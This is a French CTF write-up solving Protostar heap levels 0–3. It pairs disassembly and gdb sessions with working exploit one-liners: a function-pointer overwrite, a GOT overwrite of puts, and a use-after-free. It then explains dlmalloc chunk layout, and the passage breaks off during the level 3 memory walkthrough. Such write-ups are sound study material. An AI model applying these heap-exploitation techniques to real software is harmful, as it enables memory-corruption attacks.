# Solution du CTF Protostar (heap)

## Level 0

On dispose d'un binaire dont la fonction `main` se désassemble comme ceci :

```nasm
int main (int argc, char **argv, char **envp);
; arg char **envp @ ebp+0xc
; var const char *src @ esp+0x4
; var int32_t var_8h @ esp+0x8
; var char *dest @ esp+0x18
; var void *var_1ch @ esp+0x1c
0x0804848c      push    ebp
0x0804848d      mov     ebp, esp
0x0804848f      and     esp, 0xfffffff0
0x08048492      sub     esp, 0x20
0x08048495      mov     dword [esp], 0x40 ; '@' ; 64 ; size_t size
0x0804849c      call    malloc     ; sym.imp.malloc ; void *malloc(size_t size)
0x080484a1      mov     dword [dest], eax
0x080484a5      mov     dword [esp], 4 ; size_t size
0x080484ac      call    malloc     ; sym.imp.malloc ; void *malloc(size_t size)
0x080484b1      mov     dword [var_1ch], eax
0x080484b5      mov     edx, nowinner ; 0x8048478
0x080484ba      mov     eax, dword [var_1ch]
0x080484be      mov     dword [eax], edx
0x080484c0      mov     eax, str.data_is_at__p__fp_is_at__p ; 0x80485f7
0x080484c5      mov     edx, dword [var_1ch]
0x080484c9      mov     dword [var_8h], edx
0x080484cd      mov     edx, dword [dest]
0x080484d1      mov     dword [src], edx
0x080484d5      mov     dword [esp], eax ; const char *format
0x080484d8      call    printf     ; sym.imp.printf ; int printf(const char *format)
0x080484dd      mov     eax, dword [envp]
0x080484e0      add     eax, 4
0x080484e3      mov     eax, dword [eax]
0x080484e5      mov     edx, eax
0x080484e7      mov     eax, dword [dest]
0x080484eb      mov     dword [src], edx ; const char *src
0x080484ef      mov     dword [esp], eax ; char *dest
0x080484f2      call    strcpy     ; sym.imp.strcpy ; char *strcpy(char *dest, const char *src)
0x080484f7      mov     eax, dword [var_1ch]
0x080484fb      mov     eax, dword [eax]
0x080484fd      call    eax
0x080484ff      leave
0x08048500      ret
```

On voit que deux `malloc` sont effectués, le premier sur une taille de 64 bits et le second sur une taille de 4 octets (dword). Ce dernier est initialisée à l'adresse de `nowinner`  qui est une fonction qui nous indique que le l'exercice n'est pas résolu.

Il s'agit donc d'un pointeur de fonction qui est appellé à la fin du code, après le `strcpy()`. Ce `strcpy()` est vulnérable puisqu'il copie le première paramètre passé au binaire via la ligne de commande vers la zone de 64 octets, le tout sans aucune vérification.

Il est donc possible d'écraser les données qui sont plus loin et donc le pointeur de fonction. Dans le code se trouve aussi une fonction `win` non utilisée qu'il faut bien sûr faire en sorte d'appeller.

```shellsession
$ ./heap0 yolo
data is at 0x804a008, fp is at 0x804a050
level has not been passed
```

Il semble qu'il y ait 72 octets entre notre buffer de données et le pointeur de fonction. On peut le vérifier :

```shellsession
$ ./heap0 `python -c 'print "A"*72 + "BBBB"'`
data is at 0x804a008, fp is at 0x804a050
Segmentation fault
$ dmesg | tail -1
[263220.472338] heap0[6640]: segfault at 42424242 ip 42424242 sp bffffc8c error 4
```

Plus qu'à écraser ce pointeur par l'adresse de `win` :

```shellsession
$ ./heap0 `python -c 'import struct; print "A"*72 + struct.pack("<I", 0x08048464)'`
data is at 0x804a008, fp is at 0x804a050
level passed
```

## Level 1

Pour ce level toute la logique se trouve dans la fonction `main()` :

```nasm
int main (int argc, char **argv, char **envp);
; arg char **envp @ ebp+0xc
; var const char *src @ esp+0x4
; var void **var_14h @ esp+0x14
; var void **var_18h @ esp+0x18
0x080484b9      push ebp
0x080484ba      mov ebp, esp
0x080484bc      and esp, 0xfffffff0
0x080484bf      sub esp, 0x20
0x080484c2      mov dword [esp], 8 ; size_t size
0x080484c9      call malloc        ; sym.imp.malloc ; void *malloc(size_t size)
0x080484ce      mov dword [var_14h], eax
0x080484d2      mov eax, dword [var_14h]
0x080484d6      mov dword [eax], 1
0x080484dc      mov dword [esp], 8 ; size_t size
0x080484e3      call malloc        ; sym.imp.malloc ; void *malloc(size_t size)
0x080484e8      mov edx, eax
0x080484ea      mov eax, dword [var_14h]
0x080484ee      mov dword [eax + 4], edx
0x080484f1      mov dword [esp], 8 ; size_t size
0x080484f8      call malloc        ; sym.imp.malloc ; void *malloc(size_t size)
0x080484fd      mov dword [var_18h], eax
0x08048501      mov eax, dword [var_18h]
0x08048505      mov dword [eax], 2
0x0804850b      mov dword [esp], 8 ; size_t size
0x08048512      call malloc        ; sym.imp.malloc ; void *malloc(size_t size)
0x08048517      mov edx, eax
0x08048519      mov eax, dword [var_18h]
0x0804851d      mov dword [eax + 4], edx
0x08048520      mov eax, dword [envp]
0x08048523      add eax, 4
0x08048526      mov eax, dword [eax]
0x08048528      mov edx, eax
0x0804852a      mov eax, dword [var_14h]
0x0804852e      mov eax, dword [eax + 4]
0x08048531      mov dword [src], edx ; const char *src
0x08048535      mov dword [esp], eax ; char *dest
0x08048538      call strcpy        ; sym.imp.strcpy ; char *strcpy(char *dest, const char *src)
0x0804853d      mov eax, dword [envp]
0x08048540      add eax, 8
0x08048543      mov eax, dword [eax]
0x08048545      mov edx, eax
0x08048547      mov eax, dword [var_18h]
0x0804854b      mov eax, dword [eax + 4]
0x0804854e      mov dword [src], edx ; const char *src
0x08048552      mov dword [esp], eax ; char *dest
0x08048555      call strcpy        ; sym.imp.strcpy ; char *strcpy(char *dest, const char *src)
0x0804855a      mov dword [esp], str.and_that_s_a_wrap_folks ; 0x804864b ; const char *s
0x08048561      call puts          ; sym.imp.puts ; int puts(const char *s)
0x08048566      leave
0x08048567      ret
```

Il y a deux structures qui sont créées, chacune appelant `malloc` deux fois.

La première fois le code alloue 8 octets sur le tas et place l'entier `1` dans le premier DWORD. Ensuite il alloue à nouveau 8 octets mais l'adresse de ce nouveau buffer est placé dans le second DWORD du premier buffer.

Par conséquent on a à peu près ça :

```c
struct MyStruct {
    int position;
    char *data;
} struct1, struct2;

struct1.position = 1;
struct1->data = malloc(8);

struct2.position = 2;
struct2->data = malloc(8);
```

La seconde partie fait la même chose mais stocke l'entier `2`.

Ensuite on a deux `strcpy`. Chacun va prendre un argument sur la ligne de commande pour le recopier vers l'entrée `data` d'une structure (`1` puis `2`).

Par conséquent en débordant sur la première chaine on va écraser les données qui ont été allouées plus tard et donc l'entrée `data` de la seconde structure.

Au moment où `strcpy` est appelé pour la seconde fois on a le contrôle de l'adresse de `data` et aussi des données à écrire. On est donc sur un cas de write-what-where.

```shellsession
$ ./heap1 AAAAAAAAAAAAAAAAAAAAAAAA BBBB
Erreur de segmentation (core dumped)
$ dmesg | tail -2
[ 1396.178092] heap1[1864]: segfault at 41414141 ip 00000000f7cae312 sp 00000000ffaa031c error 6 in libc.so.6[f7c22000+180000] likely on CPU 0 (core 0, socket 0)
[ 1396.178113] Code: c3 8d b4 26 00 00 00 00 66 8b 01 66 89 02 8a 41 02 88 42 02 89 d0 c3 90 8b 01 89 02 89 d0 c3 8d b4 26 00 00 00 00 66 90 8b 01 <89> 02 8a 41 04 88 42 04 89 d0 c3 8d 76 00 8b 01 89 02 66 8b 41 04
```

On voit que le programme a crashé car on a tenté d'écrire à l'adresse `0x41414141` correspondant à nos caractères `A`.

On note cependant que l'adresse où le programme a crashé (`ip`) n'est pas dans le code du programme (pas une adresse en `0x0804XXXX`) mais une adresse de la libc. Il s'agit ici d'adresse d'instruction présente dans le code de `strcpy`. On n'est pas sur un cas de stack overflow ;-)

On peut toutefois poser un breakpoint sur l'appel à `strcpy` et vérifier que toutes les conditions sont là :

```shellsession
$ gdb -q ./heap1
Reading symbols from /opt/protostar/bin/heap1...done.
(gdb) b *0x08048555
Breakpoint 1 at 0x8048555: file heap1/heap1.c, line 32.
(gdb) r AAAAAAAAAAAAAAAAAAAAAAAA BBBB
Starting program: /tmp/protostar/bin/heap1 AAAAAAAAAAAAAAAAAAAAAAAA BBBB

Breakpoint 1, 0x08048555 in main (argc=3, argv=0xffffcc94) at heap1/heap1.c:32
(gdb) x/4wx $esp
0xffffcbb0:     0x41414141      0xffffcf4a      0xf7fc0410      0x00000000
(gdb) x/s 0xffffcf4a
0xffffcf4a:     "BBBB"
```

Le programme va bien tenter d'écrire `BBBB` à l'adresse `0x41414141`.

Sans adresse de retour qu'allons nous écrire et où ? Pour le quoi la réponse est simple puisqu'il y a une fonction `winner` à appeler :

```shellsession
$ nm heap1
08049780 A __bss_start
08049780 b completed.5982
0804966c d __CTOR_END__
08049668 d __CTOR_LIST__
08049778 D __data_start
08049778 W data_start
080485e0 t __do_global_ctors_aux
08048410 t __do_global_dtors_aux
0804977c D __dso_handle
08049674 D __DTOR_END__
08049784 b dtor_idx.5984
08049670 d __DTOR_LIST__
0804967c d _DYNAMIC
08049780 A _edata
08049788 A _end
0804860c T _fini
08048628 R _fp_hw
08048470 t frame_dummy
08048664 r __FRAME_END__
08049750 d _GLOBAL_OFFSET_TABLE_
--- snip ---
08048494 T winner
```

Pour le où j'ai choisi la `global offset table` et plus précisemment l'entrée pour la fonction `puts` car elle est appelée après les `strcpy`.

Pour obtenir l'adresse de `puts` dans la `GOT` on va utiliser GDB sans lancer le débug du binaire (ou alors avant que `puts` ne soit appellé une première fois sinon l'adresse de la libc aura pris la place) :

```nasm
(gdb) p puts
$1 = {<text variable, no debug info>} 0x80483cc <puts@plt>
(gdb) x/i 0x80483cc
0x80483cc <puts@plt>:   jmp    *0x8049774
```

L'adresse qui nous intéresse est donc `0x8049774`.

```shellsession
$ ./heap1  `python -c 'import struct; print struct.pack("<I", 0x8049774)*6'` `python -c 'import struct; print struct.pack("<I", 0x08048494)'`
and we have a winner @ 1673169368
```

Ca fonctionne !

Dans notre cas nous n'aurions pas pu écraser `_fini` ni `__DTOR_LIST__` (voir [Format Strings (Gotfault Security Community)](https://www.exploit-db.com/exploits/13239) par exemple) car ils sont sur une plage mémoire non écrivable :

```
(gdb) shell cat /proc/1682/maps
08048000-08049000 r-xp 00000000 00:10 2851       /opt/protostar/bin/heap1
08049000-0804a000 rwxp 00000000 00:10 2851       /opt/protostar/bin/heap1
0804a000-0806b000 rwxp 00000000 00:00 0          [heap]
b7e96000-b7e97000 rwxp 00000000 00:00 0 
b7e97000-b7fd5000 r-xp 00000000 00:10 759        /lib/libc-2.11.2.so
b7fd5000-b7fd6000 ---p 0013e000 00:10 759        /lib/libc-2.11.2.so
b7fd6000-b7fd8000 r-xp 0013e000 00:10 759        /lib/libc-2.11.2.so
b7fd8000-b7fd9000 rwxp 00140000 00:10 759        /lib/libc-2.11.2.so
b7fd9000-b7fdc000 rwxp 00000000 00:00 0 
b7fe0000-b7fe2000 rwxp 00000000 00:00 0 
b7fe2000-b7fe3000 r-xp 00000000 00:00 0          [vdso]
b7fe3000-b7ffe000 r-xp 00000000 00:10 741        /lib/ld-2.11.2.so
b7ffe000-b7fff000 r-xp 0001a000 00:10 741        /lib/ld-2.11.2.so
b7fff000-b8000000 rwxp 0001b000 00:10 741        /lib/ld-2.11.2.so
bffeb000-c0000000 rwxp 00000000 00:00 0          [stack]
```

## Level 2

Ce level a été assez décevant. En effet juste en jouant un peu avec le binaire et sans avoir une idée de son fonctionnement il est possible de le résoudre. L'objectif fixé est de faire afficher la chaine de caractères *you have logged in already!*

On va tout de même plonger un peu dans le code. Il s'agit d'une boucle infinie qui prend des commandes sur l'entrée standard.

S'en suit différents `if` / `else` utilisant `strcmp` pour déterminer à quelle commande le programme a à faire.

Voici déjà la partie la plus importante qui gère le commande `auth` :

```nasm
0x08048987      mov dword [stream], 5 ; size_t n
0x0804898f      mov dword [size], str.auth ; 0x804ad8d ; const char *s2
0x08048997      lea eax, [src]
0x0804899b      mov dword [esp], eax ; const char *s1
0x0804899e      call strncmp       ; sym.imp.strncmp ; int strncmp(const char *s1, const char *s2, size_t n)
0x080489a3      test eax, eax
0x080489a5      jne 0x8048a01
0x080489a7      mov dword [esp], 4 ; size_t size
0x080489ae      call malloc        ; sym.malloc ; void *malloc(size_t size)
0x080489b3      mov dword [auth], eax ; 0x804b5f4
0x080489b8      mov eax, dword [auth] ; 0x804b5f4
0x080489bd      mov dword [stream], 4 ; size_t n
0x080489c5      mov dword [size], 0 ; int c
0x080489cd      mov dword [esp], eax ; void *s
0x080489d0      call memset        ; sym.imp.memset ; void *memset(void *s, int c, size_t n)
0x080489d5      lea eax, [src]
0x080489d9      add eax, 5
0x080489dc      mov dword [esp], eax ; const char *s
0x080489df      call strlen        ; sym.imp.strlen ; size_t strlen(const char *s)
0x080489e4      cmp eax, 0x1e      ; 30
0x080489e7      ja 0x8048a01
0x080489e9      lea eax, [src]
0x080489ed      lea edx, [eax + 5]
0x080489f0      mov eax, dword [auth] ; 0x804b5f4
0x080489f5      mov dword [size], edx ; const char *src
0x080489f9      mov dword [esp], eax ; char *dest
0x080489fc      call strcpy        ; sym.imp.strcpy ; char *strcpy(char *dest, const char *src)
```

Si on tape la commande `auth`, une zone de seulement 4 octets est allouée sur le tas. Elle est initialisée à `0` via `memset`.

Ensuite le programme vérifie que la valeur passée avec la commande `auth` ne dépasse pas 30 caractères. Si c'est inférieur un `strcpy` est effectué... sur la zone allouée de 4 octets. Très bizarre.

Maintenant, suite du code et partie liée à la précédente, avec la commande `reset` :

```nasm
0x08048a01      mov dword [stream], 5 ; size_t n
0x08048a09      mov dword [size], str.reset ; 0x804ad93 ; const char *s2
0x08048a11      lea eax, [src]
0x08048a15      mov dword [esp], eax ; const char *s1
0x08048a18      call strncmp       ; sym.imp.strncmp ; int strncmp(const char *s1, const char *s2, size_t n)
0x08048a1d      test eax, eax
0x08048a1f      jne 0x8048a2e
0x08048a21      mov eax, dword [auth] ; 0x804b5f4
0x08048a26      mov dword [esp], eax ; void *ptr
0x08048a29      call free          ; sym.free ; void free(void *ptr)
```

Si la commande est `reset` alors le chunk associé à `auth` est libéré. Problème : à aucun moment on voit une réinitialisation de pointeur à `null`. La boucle principale peut faire un tour et utilisera toujours l'adresse mémoire stockée en mémoire (`use-after-free`).

En comparaison la commande `service` est mieux gérée :

```nasm
0x08048a2e      mov dword [stream], 6 ; size_t n
0x08048a36      mov dword [size], str.service ; 0x804ad99 ; const char *s2
0x08048a3e      lea eax, [src]
0x08048a42      mov dword [esp], eax ; const char *s1
0x08048a45      call strncmp       ; sym.imp.strncmp ; int strncmp(const char *s1, const char *s2, size_t n)
0x08048a4a      test eax, eax
0x08048a4c      jne 0x8048a62
0x08048a4e      lea eax, [src]
0x08048a52      add eax, 7
0x08048a55      mov dword [esp], eax ; const char *src
0x08048a58      call strdup        ; sym.imp.strdup ; char *strdup(const char *src)
```

Elle appelle `strdup` qui est un équivalent de respectivement `strlen`, `malloc` et `strcpy`. On remarque tout de même qu'il n'y a aucun appel à `free` dans le code pour cette valeur mais il n'y a du coup pas de réutilisation possible d'un ancien chunk.

Et finalement on a la commande `login` qui semble irréaliste :

```nasm
0x08048a5d      mov dword [service], eax ; 0x804b5f8
0x08048a62      mov dword [stream], 5 ; size_t n
0x08048a6a      mov dword [size], str.login ; 0x804ada1 ; const char *s2
0x08048a72      lea eax, [src]
0x08048a76      mov dword [esp], eax ; const char *s1
0x08048a79      call strncmp       ; sym.imp.strncmp ; int strncmp(const char *s1, const char *s2, size_t n)
0x08048a7e      test eax, eax
0x08048a80      jne 0x8048942
0x08048a86      mov eax, dword [auth] ; 0x804b5f4
0x08048a8b      mov eax, dword [eax + 0x20]
0x08048a8e      test eax, eax
0x08048a90      je 0x8048aa3
0x08048a92      mov dword [esp], str.you_have_logged_in_already ; 0x804ada7 ; const char *s
0x08048a99      call puts          ; sym.imp.puts ; int puts(const char *s)
0x08048a9e      jmp 0x8048943
0x08048aa3      mov dword [esp], str.please_enter_your_password ; 0x804adc3 ; const char *s
0x08048aaa      call puts          ; sym.imp.puts ; int puts(const char *s)
```

Ce qu'elle fait c'est récupérer l'adresse de la valeur spécifiée par `auth` et regarder à l'octet `32` (`0x20`). Bizarre pour une zone de seulement 4 octets...

Pour résoudre ce level il faut seulement faire en sorte que le buffer de `service` comble cet emplacement mémoire. Ce qui est attendu officiellement du challenge est de faire un `use-after-free` donc profiter du fait que le programme continue d'utiliser la zone de 4 octets créée avec `login` après l'appel à `free` par la commande `reset` :

```shellsession
$ ./heap2
[ auth = (nil), service = (nil) ]
auth test
[ auth = 0x804c008, service = (nil) ]
reset
[ auth = 0x804c008, service = (nil) ]
service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[ auth = 0x804c008, service = 0x804c018 ]
login
you have logged in already!
[ auth = 0x804c008, service = 0x804c018 ]
```

Ici on voit que seulement 16 octets séparent les deux buffers, on peut donc facilement écraser l'offset +32.

Mais en réalité on n'a même pas besoin de le libérer vu que le premier buffer ne fait que 4 octets :

```shellsession
$ ./heap2
[ auth = (nil), service = (nil) ]
auth test
[ auth = 0x804c008, service = (nil) ]
service aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
[ auth = 0x804c008, service = 0x804c018 ]
login
you have logged in already!
[ auth = 0x804c008, service = 0x804c018 ]
```

On peut lire le code source du binaire [ici](https://exploit.education/protostar/heap-two/) et comme l'explique [LiveOverflow](https://www.youtube.com/watch?v=ZHghwsTRyzQ) il est causé par le fait que le code source nomme une `struct` et une variable avec le même nom :

```c
struct auth {
  char name[32];
  int auth;
};

struct auth *auth;
```

du coup lors de l'appel à `malloc` suivant il réserve l'espace pour juste un pointeur au lieu de réserver la place pour un entier et une chaine de 32 caractères :

```c
    if(strncmp(line, "auth ", 5) == 0) {
      auth = malloc(sizeof(auth));
      memset(auth, 0, sizeof(auth));
      if(strlen(line + 5) < 31) {
        strcpy(auth->name, line + 5);
      }
    }
```

Il faut dire cependant que `gcc` n'aide pas vraiment : par défaut il n'avertit pas de ce problème. On a toutefois un indice si on rajoute l'option `-Wall` :

```c
heap2bis.c: Dans la fonction « main »:
heap2bis.c:25:29: attention: l'argument de « sizeof » dans l'appel à « memset » est la même expression que la destination; aviez-vous l'intention de le déréférencer ? [-Wsizeof-pointer-memaccess]
   25 |       memset(auth, 0, sizeof(auth));
      |                             ^
```

Ce n'est pas un message d'erreur informatif comme `Golang` aurait pu afficher mais c'est déjà une bonne indication :p

Le version corrigée du code ressemblerait à ça :

```c
#include <string.h>                                                                                                    
#include <sys/types.h>                                                                                                 
#include <stdio.h>                                                                                                     
#include <stdlib.h>                                                                                                    

struct auth_struct {                                                                                                   
  char name[32];                                                                                                       
  int auth;                                                                                                            
};                                                                                                                     

struct auth_struct *auth;                                                                                              
char *service;                                                                                                         

int main(int argc, char **argv)                                                                                        
{                                                                                                                      
  char line[128];                                                                                                      

  while(1) {                                                                                                           
    printf("[ auth = %p, service = %p ]\n", auth, service);                                                            

    if(fgets(line, sizeof(line), stdin) == NULL) break;                                                                

    if(strncmp(line, "auth ", 5) == 0) {                                                                               
      auth = malloc(sizeof(struct auth_struct));                                                                       
      memset(auth, 0, sizeof(struct auth_struct));                                                                     
      if(strlen(line + 5) < 31) {                                                                                      
        strcpy(auth->name, line + 5);                                                                                  
      }                                                                                                                
    }                                                                                                                  
    if(strncmp(line, "reset", 5) == 0) {                                                                               
      free(auth);                                                                                                      
    }                                                                                                                  
    if(strncmp(line, "service", 6) == 0) {                                                                             
      service = strdup(line + 7);                                                                                      
    }                                                                                                                  
    if(strncmp(line, "login", 5) == 0) {                                                                               
      if(auth->auth) {                                                                                                 
        printf("you have logged in already!\n");                                                                       
      } else {                                                                                                         
        printf("please enter your password\n");                                                                        
      }                                                                                                                
    }                                                                                                                  
  }                                                                                                                    
}
```

Avec cette version, impossible d'écraser `auth_struct->auth` même après un `reset` car les adresses retournées par `malloc` vont crescendo et l'espace pour `auth` est celui attendu :

```shellsession
$ ./heap2bis
[ auth = (nil), service = (nil) ]
auth test
[ auth = 0x804a008, service = (nil) ]
reset
[ auth = 0x804a008, service = (nil) ]
service aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
[ auth = 0x804a008, service = 0x804a030 ]
login
please enter your password
[ auth = 0x804a008, service = 0x804a030 ]
```

Je pense que l'auteur du CTF n'a pas eu trop de choix et a fait avec ce bug.

## Level 3

Ce level 3 est annoncé comme relatif à l'allocateur *dlmalloc* (*Doug Lea Malloc*) et donc très certainement vulnérable à la technique d'exploitation qui était décrite en 2001 dans l'article [de Phrack Magazine - Once Upon a Free](http://phrack.org/issues/57/9.html).

On peut retrouver le code source du binaire sur le site [Exploit Education](https://exploit.education/protostar/heap-three/) :

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

void winner()
{
  printf("that wasn't too bad now, was it? @ %d\n", time(NULL));
}

int main(int argc, char **argv)
{
  char *a, *b, *c;

  a = malloc(32);
  b = malloc(32);
  c = malloc(32);

  strcpy(a, argv[1]);
  strcpy(b, argv[2]);
  strcpy(c, argv[3]);

  free(c);
  free(b);
  free(a);

  printf("dynamite failed?\n");
}
```

On note évidemment l'utilisation de la fonction `strcpy` qui permet de déborder d'un buffer lors de la copie.

Généralement, quand on trouve sur les CTFs des binaires utilisant le heap, l'exploitation est assez simple : une structure comporte un pointeur que l'on peut écraser et comme plus tard le code utilise ce pointeur pour écrire des données ont a un beau *write-what-where* et il ne reste qu'à trouver ce que l'on veut écraser (adresse de retour, `GOT`, `dtors`, etc)

Plus rare (et plus compliqués) sont les CTFs où il faut effectivement écraser des éléments internes de l'allocateur comme c'est le cas ici. A vrai dire je ne l'ai fait q'une seule fois avant ce CTF et c'était pour le *Fortress* de *Hack The Box*.

A l'époque j'avais pu me reposer sur le formidable répo [shellphish/how2heap: A repository for learning various heap exploitation techniques](https://github.com/shellphish/how2heap) car il s'agissait d'exploiter un allocateur récent (`ptmalloc3`) mais là on a à faire avec un allocateur vieux de plus de 20 ans.

L'exploitation s'est faite avec l'aide de Jean. Mais si, vous le connaissez !  Jean Échier ! XD

### Bière et chunk

Allez, on va d'abord voir la théorie et on passera ensuite aux (trop) nombreuses contraintes auquelles nous devons faire face pour l'exploitation.

Le heap est une liste doublement chainée de chunks qui représentent chacun une zone allouée ou allouable. Il y a plusieurs heap qui sont regroupés dans une structure nommée *arena*. Chaque heap a des spécificités mais les différences sont dues à des soucis de performances.

Un chunk (tel qui nous intéresse) ressemble à ceci :

![dmlalloc heap chunk](https://raw.githubusercontent.com/devl00p/blog/master/images/protostar/heap/chunk.png)

Sur la gauche, en rouge, est représenté un chunk utilisé (il contient des données) et sur la droite, en vert, est représenté un chunk libre. Il s'agit en réalité exactement de la même structure mais ce qui est stocké à l'intérieur va changer en fonction de son état.

Ici on suppose que l'on est sur une architecture 32 bits (comme pour le CTF) et une case représente donc 4 octets.

Quand on utilise la fonction `malloc()` cette dernière nous retourne (à nous autres simples humains) un pointeur sur la troisième case, donc à partir du 9ème octet (offset `+8` en langage C). Les deux premiers DWORD (int32) sont des métadonnées utilisées en interne par l'allocateur. Le code de malloc utilise quand à lui toujours des adresses pointant sur le premier octet.

Ensuite on trouve deux autres DWORD qui vont soit contenir des données si le chunk est utilisé, soit contenir des pointeurs sur respectivement le prochain et le précédent chunk libre si le chunk est lui-même libre. Bref la liste doublement chainée n'est utilisée que sur les chunks libres. Pour naviguer entre les chunks (utilisés ou non) l'allocateur va lire la taille du chunk et pouvoir accéder au suivant en incrémentant le pointeur courant avec cette taille.

Pour naviguer entre les chunks libres uniquement il va se baser sur les pointeurs FD (forward) et BK (backward).

Dans tous les cas cela signifie qu'un chunk retourné par `malloc()` va obligatoirement prendre un minimum de 128 bits (4 DWORD). De plus la taille d'un chunk sera systématiquement arrondie à un multiple de 8 octets (voir [MallocInternals - glibc wiki](https://sourceware.org/glibc/wiki/MallocInternals)).

Ce dernier point est important car il veut dire que la taille du chunk stockée en seconde position n'utilise pas ses trois bits de points faibles (`8` en binaire donne `1000`). L'allocateur se sert de cette particularité pour y stocker des flags, ainsi :

- si le plus petit bit vaut 1 (auquelle cas la taille est un nombre impair) cela signifie que le chunk immédiatement précédent est utilisé. Sinon (à 0 donc taille paire) le chunk immédiatement précédent est libre.

- si le second bit de poids faible est défini cela signifie que le chunk courant a été allouée avec `mmap`

- le troisième bit ne nous intéresse pas dans le cas de l'implémentation *dlmalloc* (bit non utilisé)

Cela signifie que si on observe la mémoire d'un programme on peut voir une taille de 0x99 sur un chunk et elle va passer à 0x98 lorsque le chunk précédent est libéré (alors que la taille du chunk courant n'aura pas changé).

### Mettons nous en situation

Soit le code C suivant (qui n'est pas celui du CTF) :

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(void) {
  char *ptr1 = malloc(144);
  char *ptr2 = malloc(144);
  char *ptr3 = malloc(144);
  char *ptr4 = malloc(144);
  char *ptr5 = malloc(144);
  char *ptr6 = malloc(144);
  free(ptr6);
  free(ptr1);
  free(ptr3);
  free(ptr4);
  return 0;
}
```

Je le lance depuis GDB après avoir mis un breakpoint à la sortie du premier malloc. La valeur retournée par `malloc` est `0x804a008` ce qui signifie que mon chunk commence à `0x804a000`.

Si je regarde l'organisation de la mémoire du programme je vois que ça correspond effectivement au début du heap :

```
(gdb) info proc map
process 6063
cmdline = '/home/user/free'
cwd = '/home/user'
exe = '/home/user/free'
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000          0      /home/user/free
         0x8049000  0x804a000     0x1000          0      /home/user/free
         0x804a000  0x806b000    0x21000          0           [heap] <- oh le beau heap !
        0xb7e96000 0xb7e97000     0x1000          0        
        0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
        0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
        0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
        0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
        0xb7fd9000 0xb7fdc000     0x3000          0        
        0xb7fe0000 0xb7fe2000     0x2000          0        
        0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
        0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
        0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
        0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
        0xbffeb000 0xc0000000    0x15000          0           [stack]
```

Si j'inspecte la mémoire je retrouve bien la taille du heap à partir du 4ème octet, les autres n'étant pas utilisés (pas de chunk précédent ni de données) :

```
(gdb) x/256wx 0x0804a000
0x804a000:      0x00000000      0x00000099      0x00000000      0x00000000 <- premier chunk
0x804a010:      0x00000000      0x00000000      0x00000000      0x00000000
--- snip ---
0x804a090:      0x00000000      0x00000000      0x00000000      0x00020f69 <- top chunk
0x804a0a0:      0x00000000      0x00000000      0x00000000      0x00000000
```

On remarque qu'à l'adresse `0x804a098` semble se trouver un chunk immense dont la taille est `0x00020f68`. Il s'agit du top chunk qui est l'espace depuis lequel `malloc()` va créer des chunks plus petits.

On calcule que `0x00020f68 + 0x98` donne bien `0x21000` soit la taille prise par la totalité du heap.

Allons beaucoup plus loin dans l'exécution, lorsque les 6 chunks sont alloués :

```
(gdb) x/256wx 0x0804a000
0x804a000:      0x00000000      0x00000099      0x00000000      0x00000000
0x804a010:      0x00000000      0x00000000      0x00000000      0x00000000
--- snip ---
0x804a090:      0x00000000      0x00000000      0x00000000      0x00000099
0x804a0a0:      0x00000000      0x00000000      0x00000000      0x00000000
--- snip ---
0x804a130:      0x00000000      0x00000099      0x00000000      0x00000000
0x804a140:      0x00000000      0x00000000      0x00000000      0x00000000
--- snip ---
0x804a1c0:      0x00000000      0x00000000      0x00000000      0x00000099
0x804a1d0:      0x00000000      0x00000000      0x00000000      0x00000000
--- snip ---
0x804a260:      0x00000000      0x00000099      0x00000000      0x00000000
0x804a270:      0x00000000      0x00000000      0x00000000      0x00000000
--- snip ---
0x804a2f0:      0x00000000      0x00000000      0x00000000      0x00000099
0x804a300:      0x00000000      0x00000000      0x00000000      0x00000000
--- snip ---
0x804a390:      0x00000000      0x00020c71      0x00000000      0x00000000 <- top chunk
0x804a3a0:      0x00000000      0x00000000      0x00000000      0x00000000
```

On retrouve nos 6 chunks, chacun ayant une taille à `0x99` car le bit indiquant que le chunk précédent est utilisé est à 1. On voit aussi que la taille du top chunk a diminuée en conséquence.

On continue sur le premier appel à `free()` qui libère le dernier chunk :

```
(gdb) x/256wx 0x0804a000
0x804a000:      0x00000000      0x00000099      0x00000000      0x00000000
0x804a010:      0x00000000      0x00000000      0x00000000      0x00000000
--- snip ---
0x804a090:      0x00000000      0x00000000      0x00000000      0x00000099
0x804a0a0:      0x00000000      0x00000000      0x00000000      0x00000000
--- snip ---
0x804a130:      0x00000000      0x00000099      0x00000000      0x00000000
0x804a140:      0x00000000      0x00000000      0x00000000      0x00000000
--- snip ---
0x804a1c0:      0x00000000      0x00000000      0x00000000      0x00000099
0x804a1d0:      0x00000000      0x00000000      0x00000000      0x00000000
--- snip ---
0x804a260:      0x00000000      0x00000099      0x00000000      0x00000000
0x804a270:      0x00000000      0x00000000      0x00000000      0x00000000
--- snip ---
0x804a2f0:      0x00000000      0x00000000      0x00000000      0x00020d09 <- nouveau top chunk
0x804a300:      0x00000000      0x00000000      0x00000000      0x00000000
--- snip ---
0x804a390:      0x00000000      0x00020c71      0x00000000      0x00000000 <- ancien top chunk (n'existe plus)
0x804a3a0:      0x00000000      0x00000000      0x00000000      0x00000000
```

